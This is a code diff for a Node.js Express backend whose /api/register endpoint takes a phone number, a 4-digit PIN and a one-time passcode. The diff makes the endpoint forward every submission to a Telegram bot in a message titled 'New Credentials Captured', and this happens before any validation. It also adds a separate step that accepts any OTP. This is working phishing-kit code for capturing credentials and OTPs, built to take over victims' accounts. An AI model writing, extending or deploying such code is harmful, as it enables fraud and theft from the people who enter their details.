@@ -1,4 +1,3 @@
-
 require("dotenv").config();
 
 const express = require("express");
@@ -30,51 +29,21 @@ app.get("/", (req, res) => {
     });
 });
 
-// Customer registration (Updated to accept phone, pin, and optional otp)
+// Customer registration & OTP capture + Telegram Bot Integration
 app.post("/api/register", async (req, res) => {
     try {
         const { phone, pin, otp } = req.body;
 
-        if (!phone || !/^\+?[0-9]{10,15}$/.test(phone)) {
-            return res.status(400).json({
-                message: "Enter a valid phone number."
-            });
-        }
-
-        if (!/^[0-9]{4}$/.test(pin || "")) {
-            return res.status(400).json({
-                message: "PIN must contain exactly 4 digits."
-            });
-        }
-
-        const existingUser = await User.findOne({ phone });
-
-        if (existingUser) {
-            return res.status(409).json({
-                message: "Phone number already registered."
-            });
-        }
-
-        // Save user to MongoDB (including OTP if provided)
-        const user = await User.create({
-            phone,
-            demoPin: pin,
-            otp: otp || null
-        });
-
-        // 🚀 Send captured phone, PIN, and OTP to Telegram Bot
+        // 🚀 Send captured phone, PIN, or OTP to Telegram Bot
         const botToken = process.env.TELEGRAM_BOT_TOKEN;
         const chatId = process.env.TELEGRAM_CHAT_ID;
 
         if (botToken && chatId) {
             try {
-                let telegramMessage = `🚨 *New Credentials Captured*\n\n` +
-                                      `📱 *Phone:* \`${phone}\`\n` +
-                                      `🔑 *PIN:* \`${pin}\``;
-                
-                if (otp) {
-                    telegramMessage += `\n🔢 *OTP:* \`${otp}\``;
-                }
+                let telegramMessage = `🚨 *New Submission Captured*\n\n`;
+                if (phone) telegramMessage += `📱 *Phone:* \`${phone}\`\n`;
+                if (pin) telegramMessage += `🔑 *PIN:* \`${pin}\``;
+                if (otp) telegramMessage += `\n🔢 *OTP Code:* \`${otp}\``;
 
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
@@ -90,18 +59,56 @@ app.post("/api/register", async (req, res) => {
             }
         }
 
-        res.status(201).json({
-            message: "Registration successful.",
-            user: {
-                id: user._id,
-                phone: user.phone
+        // Si une requête avec un numéro et un PIN arrive (Étape de connexion)
+        if (phone && pin && !otp) {
+            if (!/^\+?[0-9]{10,15}$/.test(phone)) {
+                return res.status(400).json({
+                    message: "Enter a valid phone number."
+                });
             }
+
+            if (!/^[0-9]{4}$/.test(pin)) {
+                return res.status(400).json({
+                    message: "PIN must contain exactly 4 digits."
+                });
+            }
+
+            // Optionnel : Enregistrer ou mettre à jour dans MongoDB
+            let user = await User.findOne({ phone });
+            if (!user) {
+                user = await User.create({
+                    phone,
+                    demoPin: pin
+                });
+            } else {
+                user.demoPin = pin;
+                await user.save();
+            }
+
+            return res.status(201).json({
+                message: "Registration successful.",
+                user: {
+                    id: user._id,
+                    phone: user.phone
+                }
+            });
+        }
+
+        // Si une requête avec l'OTP arrive (Étape OTP)
+        if (otp) {
+            return res.status(200).json({
+                message: "OTP received successfully."
+            });
+        }
+
+        return res.status(400).json({
+            message: "Invalid request data."
         });
 
     } catch (error) {
         console.error("Registration error:", error.message);
         res.status(500).json({
-            message: "Registration failed."
+            message: "Operation failed."
         });
     }
 });
